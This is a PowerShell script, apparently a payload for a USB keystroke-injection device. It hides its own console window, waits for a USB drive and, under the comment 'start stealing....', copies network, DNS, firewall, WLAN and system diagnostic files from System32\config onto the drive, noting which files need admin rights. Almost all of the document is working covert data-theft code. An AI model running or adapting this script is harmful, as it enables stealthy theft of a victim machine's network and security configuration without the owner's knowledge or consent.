# .Net methods for hiding/showing the console in the background
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console

# Check if a USB jump drive is inserted in the local computer.
do {
  	$UsbDisk = gwmi win32_diskdrive | ?{$_.interfacetype -eq "USB"} | %{gwmi -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID=`"$($_.DeviceID.replace('\','\\'))`"} WHERE AssocClass = Win32_DiskDriveToDiskPartition"} |  %{gwmi -Query "ASSOCIATORS OF {Win32_DiskPartition.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass = Win32_LogicalDiskToPartition"} | %{$_.deviceid} 
	if ( $UsbDisk -eq $null ) {  
		Write-Host "There is no USB drive detected, please insert a USB drive"
		# DO NOT RUN THIS WITHOUT SOME SORT OF "PAUSE" function, otherwise this will loop until a USB stick is inserted.
	}
}
while ($UsbDisk -eq $null)
# After the do loop, $UsbDisk will be the name of the drive letter, remember powershell start at your user profile, 

# start stealing....

#admin is not required
Copy-Item "C:\Windows\System32\config\adapterinfo.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\Dns.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\envinfo.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\FileSharing.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\Neighbors.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\osinfo.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WcnInfo.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WinsockCatalog.txt" -Destination "$UsbDisk\quack!"
#require admin
Copy-Item "C:\Windows\System32\config\gpresult.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\neteventslog.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\netiostate.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\sysportslog.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\wfplog.log" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\wfpstatelog.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WindowsFirewallConfig.txt" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WindowsFirewallEffectiveRules.txt" -Destination "$UsbDisk\quack!"
#XML files, require admin, the system take a lot of time to create this files, 
#remember to put a big delay (like 15000 20000 ms, it depends on the machine)
Copy-Item "C:\Windows\System32\config\netevents.xml" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\sysports.xml" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\wfpfilters.xml" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\wfpstate.xml" -Destination "$UsbDisk\quack!"
#log files, admin is not required!!!
Copy-Item "C:\Windows\System32\config\WindowsFirewallConsecLog.evtx" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WindowsFirewallLog.evtx" -Destination "$UsbDisk\quack!"
Copy-Item "C:\Windows\System32\config\WLANAutoConfigLog.evtx" -Destination "$UsbDisk\quack!"
